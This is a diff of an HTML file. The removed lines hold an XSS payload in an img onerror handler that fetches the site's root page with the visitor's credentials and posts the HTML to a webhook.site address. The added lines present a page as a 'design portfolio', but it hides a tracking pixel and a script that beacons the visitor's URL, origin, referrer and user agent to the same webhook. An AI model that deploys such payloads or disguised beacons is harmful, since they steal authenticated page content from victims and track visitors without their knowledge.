@@ -1,32 +1,56 @@
 
-<img src="x" onerror='
-(async () => {
-    const webhook = "https://webhook.site/eac24f4c-67b5-4837-bcc9-2740091b6393";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Design Inspiration</title>
+</head>
+<body>
+    <h1>Welcome to my design portfolio</h1>
+    <p>Explore modern web design.</p>
 
-    try {
-        const response = await fetch("/", {
-            method: "GET",
-            credentials: "include"
-        });
+    <!-- Проверка загрузки HTML даже без JavaScript -->
+    <img
+        src="https://webhook.site/eac24f4c-67b5-4837-bcc9-2740091b6393?event=html_loaded"
+        style="display:none"
+        alt=""
+    >
 
-        const html = await response.text();
+    <pre id="debug"></pre>
 
-        await fetch(webhook, {
-            method: "POST",
-            mode: "no-cors",
-            headers: {
-                "Content-Type": "text/plain"
-            },
-            body: JSON.stringify({
-                url: location.href,
-                status: response.status,
-                html: html
-            })
-        });
-    } catch (error) {
-        new Image().src =
-            webhook + "?error=" +
-            encodeURIComponent(error.message);
-    }
-})();
-'>
+    <script>
+    (function () {
+        const webhook =
+            "https://webhook.site/eac24f4c-67b5-4837-bcc9-2740091b6393";
+
+        const info = {
+            event: "js_executed",
+            url: window.location.href,
+            origin: window.location.origin,
+            referrer: document.referrer || "none",
+            user_agent: navigator.userAgent,
+            has_opener: !!window.opener,
+            timestamp: new Date().toISOString()
+        };
+
+        document.getElementById("debug").textContent =
+            JSON.stringify(info, null, 2);
+
+        function send(data) {
+            const url = new URL(webhook);
+
+            for (const [key, value] of Object.entries(data)) {
+                url.searchParams.set(key, String(value));
+            }
+
+            const img = new Image();
+            img.style.display = "none";
+            img.src = url.toString();
+            document.body.appendChild(img);
+        }
+
+        send(info);
+    })();
+    </script>
+</body>
+</html>
